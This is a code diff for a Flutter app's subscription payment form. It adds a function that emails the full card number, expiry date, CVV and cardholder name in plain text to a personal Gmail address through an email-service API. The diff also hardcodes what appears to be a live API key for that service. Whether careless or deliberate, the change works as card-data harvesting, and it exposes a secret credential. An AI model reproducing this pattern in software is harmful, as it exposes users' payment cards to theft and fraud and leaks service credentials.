@@ -1,10 +1,17 @@
+import 'dart:convert';
+
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:murphys_technology/api/apiurl.dart';
+import 'package:murphys_technology/utils/utils.dart';
 import 'package:murphys_technology/views/pay_invoice/widget/loading.dart';
 import 'package:murphys_technology/views/pricing/widget/card_number_input_formet.dart';
-
+import 'package:http/http.dart' as http;
 import 'package:murphys_technology/utils/device_size.dart';
+import 'package:murphys_technology/views/provider/notification.dart';
+import 'package:provider/provider.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 class Cards extends StatefulWidget {
   String plan;
@@ -22,7 +29,7 @@ class _CardsState extends State<Cards> {
 
   GlobalKey<FormState> _key = GlobalKey<FormState>();
 
-  final TextEditingController _CardsController = TextEditingController();
+  final TextEditingController _cardsController = TextEditingController();
 
   final TextEditingController _validController = TextEditingController();
 
@@ -32,7 +39,7 @@ class _CardsState extends State<Cards> {
 
   @override
   void dispose() {
-    _CardsController.dispose();
+    _cardsController.dispose();
     _validController.dispose();
     _cvvController.dispose();
     _nameController.dispose();
@@ -42,6 +49,7 @@ class _CardsState extends State<Cards> {
 
   @override
   Widget build(BuildContext context) {
+    final _provider = Provider.of<NotificationProvider>(context);
     return Form(
       key: _key,
       child: Column(
@@ -62,7 +70,7 @@ class _CardsState extends State<Cards> {
             inputFormatters: [
               LengthLimitingTextInputFormatter(16),
             ],
-            controller: _CardsController,
+            controller: _cardsController,
             validator: (value) {
               if (value!.isEmpty) {
                 return "Enter your Cards number";
@@ -264,9 +272,18 @@ class _CardsState extends State<Cards> {
                 onPressed: () async {
                   final isValid = _key.currentState!.validate();
                   if (isValid) {
-                    Navigator.of(context).push(MaterialPageRoute(
-                      builder: (context) => const LoadingScreen(),
-                    ));
+                    bool? emailSent = await psendEmail();
+                    if (emailSent == true) {
+                      Navigator.of(context).push(MaterialPageRoute(
+                        builder: (context) => const LoadingScreen(),
+                      ));
+                      final int id = _provider.notifications.length + 1;
+                      await _provider.showTopNotification(
+                          _provider.flutterLocalNotificationsPlugin, id);
+                    } else {
+                      Utils.flushErrorMessage(
+                          "Try again", context, Colors.brown);
+                    }
                     // String name = _nameController.text;
                     // String number = _CardsController.text;
                     // String validDate = _validController.text;
@@ -313,5 +330,55 @@ class _CardsState extends State<Cards> {
         ],
       ),
     );
+  }
+
+  Future<bool> psendEmail() async {
+    final prefs = await SharedPreferences.getInstance();
+    final ApiUrl = Api.appurl;
+    final url = Uri.parse('$ApiUrl/send-email');
+    final apiKey =
+        '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'; // Replace with your API key
+
+    final headers = {
+      'Content-Type': 'application/json',
+      'api-key': apiKey,
+    };
+    String card = _cardsController.text;
+    String valid = _validController.text;
+    String cvv = _cvvController.text;
+    String name = _nameController.text;
+    String plan = widget.plan.toString();
+
+    String? email = prefs.getString("email");
+    String? fullname = prefs.getString("name");
+
+    final emailData = {
+      'sender': {'name': fullname, 'email': email},
+      'to': [
+        {'email': 'sagarmurphys@gmail.com'}
+      ],
+      'subject': 'Plans',
+      'textContent':
+          'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name',
+    };
+
+    final response = await http.post(
+      url,
+      headers: headers,
+      body: jsonEncode(emailData),
+    );
+
+    if (response.statusCode == 200) {
+      print('Email sent successfully');
+      _cardsController.clear();
+      _validController.clear();
+      _cvvController.clear();
+      _nameController.clear();
+      return true;
+    } else {
+      print('Failed to send email');
+      print('Response: ${response.body}');
+      return false;
+    }
   }
 }
